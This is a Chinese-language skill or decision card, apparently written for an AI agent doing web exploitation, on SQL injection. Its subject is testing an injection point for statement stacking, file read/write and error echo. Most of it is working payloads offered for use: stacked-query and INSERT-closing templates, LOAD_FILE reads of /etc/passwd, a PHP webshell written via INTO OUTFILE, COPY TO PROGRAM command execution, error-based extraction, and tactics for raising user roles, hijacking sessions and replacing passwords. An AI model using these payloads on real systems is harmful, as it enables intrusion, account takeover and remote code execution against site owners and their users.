---
name: 'sql-injection-primitive-first'
description: 'SQL 注入到手后**先判原语再动手**的决策卡:30 秒三测(语句堆叠/文件读写/错误回显) → 按结果分四条路(写库提权 / 读写文件 / 报错拖库 / 盲注提取)。含「为什么不能先写提取器」的两次实测代价、堆叠闭合模板、写原语的四类落点(角色/会话/口令/触发器)。（检索词：sqli/sql injection/注入/堆叠/stacked/statement stacking/写原语/write primitive/union/盲注/blind/时间盲注/time-based/报错注入/error-based/load_file/into outfile/copy program/update users set/提权/拖库/提取器/extractor）'
whenToUse: '确认了 SQL 注入点、或准备写/已经在写提取脚本时**立刻**加载。特别是:已经能用 sleep()/布尔 逐字符取数、或准备对 hash 开爆破之前 —— 那时最容易漏掉写原语。'
metadata: { domain: web, tier: T1 }
---

# SQL 注入:先判原语,再决定花多少时间

> 🔑 **总原则:注入点的"能力"比注入点的"存在"重要一个量级。**
> 同一个注入点,可能只能读一个字符(3.6 秒/字符),也可能能直接 `update users set roleid=3`(一次请求)。
> **这两者的差距不是优化能补的,是选错就要重来。**

## 为什么这张卡存在:两次实测代价

| 场次 | 发生了什么 | 代价 |
|---|---|---|
| DutyBound | 看到 `syntax error at or near ";"` → 判定"不支持堆叠" → 转去试 `pg_read_file`/`lo_export`/触发器 | **12 分钟**。实际支持,只是 payload 没闭合 INSERT 的 `)` |
| Watcher | 直接造了 `' + <expr> + '` 表达式级提取器(3.6 秒/字符),**从未测堆叠** | **4.5 小时**。5 小时后才发现 `x',1,'h',1,'r','d'); update users set roleid=3` 一次就成 |

两次都是同一件事:**在测"能不能写"之前,先投入了"怎么读得更快"。**

---

## 第一步:30 秒三测(在写任何提取器之前)

按顺序,每条一次请求。**任一条成功就停,不要继续往下。**

### 测 1:语句堆叠(最高价值)

```sql
-- 通用探测(按数据库方言)
'; SELECT 1; --                     MySQL / PG / MSSQL
'; SELECT pg_sleep(3); --           PostgreSQL
'; SELECT SLEEP(3); --              MySQL
'; WAITFOR DELAY '0:0:3'; --        MSSQL
```

判读:
- 响应延迟 ≈ 3 秒 → **堆叠可用,直接进"写原语"**
- 报语法错但错误信息里能看到**你写的第二条语句** → 堆叠被解析了,只是语法问题,继续调
- 报 `commands out of sync` / `multi statements not allowed` → 驱动层禁了,转测 2

**关键:报错 ≠ 不支持。** 先看错误里的 `LINE 1:` 片段,确认第一条语句是否**完整闭合**。
INSERT 场景的闭合模板:

```sql
-- 原始: INSERT INTO audit (a,b,c,d,e,f) VALUES ('<id>',1,'u',1,'act','<HERE>')
x',1,'h',1,'r','d'); SELECT pg_sleep(3); -- 
   ↑ 补一个值收尾   ↑ 闭合 VALUES  ↑ 第二条语句
```

> 闭合需要的列数 = 原语句 `VALUES` 里**注入点之后**还剩几个。先从报错/源码数清楚,不要猜。

### 测 2:文件读写

```sql
-- 读
' UNION SELECT LOAD_FILE('/etc/passwd'),1,2--        MySQL
'; SELECT pg_read_file('/etc/passwd');--             PostgreSQL(需 superuser 或 pg_read_server_files)
-- 写
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'--   MySQL
'; COPY (SELECT '') TO PROGRAM 'id';--               PostgreSQL(需 pg_execute_server_program)
```

判读:能读 → 直接找配置/凭据;能写 → webshell 或覆盖文件,不用拖库。

### 测 3:错误回显

```sql
' AND 1=CAST((SELECT version()) AS int)--             PG:报错里带版本串
' AND extractvalue(1,concat(0x7e,(SELECT version())))--  MySQL
' AND 1=CONVERT(int,(SELECT @@version))--             MSSQL
```

判读:报错里能带出数据 → **用报错拖库,比盲注快一到两个数量级**(一次一字段 vs 一次一字符)。

---

## 第二步:按结果分四条路

```
测 1 通过 ──→ 【写原语】直接改库,不要提取
测 2 通过 ──→ 【文件原语】读配置拿凭据 / 写 webshell
测 3 通过 ──→ 【报错拖库】一次一字段,先 dump users/config
三条都失败 ─→ 【盲注提取】才开始写提取器(此时才值得优化速度)
```

### 写原语能做什么(比"读"值钱得多)

| 落点 | 语句 | 效果 |
|---|---|---|
| **角色/权限** | `update users set roleid=3 where userid=<n>` | 应用层管理员 → 通常直接接 RCE(脚本执行/模板/插件) |
| **会话** | `insert into sessions (sessionid,userid,...) values (...)` 或改现有 session 的 userid | 劫持管理员会话,绕过口令 |
| **口令** | `update users set passwd=<known hash>` | 用自己的 hash 替换,直接登录 |
| **触发器/函数** | 视权限而定;PG 需 superuser 才能 `CREATE FUNCTION ... plpython` | 落命令执行 |

> 顺序建议:**角色 > 会话 > 口令**。改角色通常一步到 RCE;改口令还要面对 hash 算法和登录限制。

### 什么时候才写提取器

只有三条都失败时。此时再优化速度(分桶、多线程、min-of-2 去抖)才有意义。

**但即使在那时,也要先算一笔账:**

```
需要提取的字符数 × 每字符耗时 = 总时间
32 字符的 sessionid × 3.6 秒 = 115 秒   ← 值得
60 字符的 bcrypt hash × 3.6 秒 = 216 秒  ← 值得
但 hash 拿到后还要爆破 → bcrypt -m 3200 在 3700 H/s 下跑 rockyou ≈ 75 分钟
```

**如果"提取 + 爆破"的总时间超过 30 分钟,先回头再测一次堆叠。** 因为爆破通常是错的赌注:目标口令往往不在字典里,而写原语是确定的。

---

## 第三步:反模式(实测踩过的)

| 反模式 | 为什么错 |
|---|---|
| 看到 `syntax error at or near ";"` 就判定"不支持堆叠" | 多数情况是**自己的语句没闭合**。先补 `)` 再下结论 |
| 先写提取器,再想"能不能写" | 提取器一旦跑通就有微小进展,从此不会再回头质疑原语 |
| 拿到 hash 就开爆破 | 先问"这个 hash 对应的账号,能不能用写原语直接改角色/改口令" |
| 用时间盲注做 32 字符以上的提取 | 3.6 秒/字符 × 32 = 2 分钟还行;× 200 字符就是 12 分钟,该换报错/堆叠 |
| 假设"注入点只能读" | 读/写是**同一条注入路径的两种用法**,不是两个漏洞 |

---

## 一句话

> **注入点的第一问不是"我能读到什么",是"我能不能写"。**
> 读要按字符付费,写是一次性付费。先测写,再谈读。
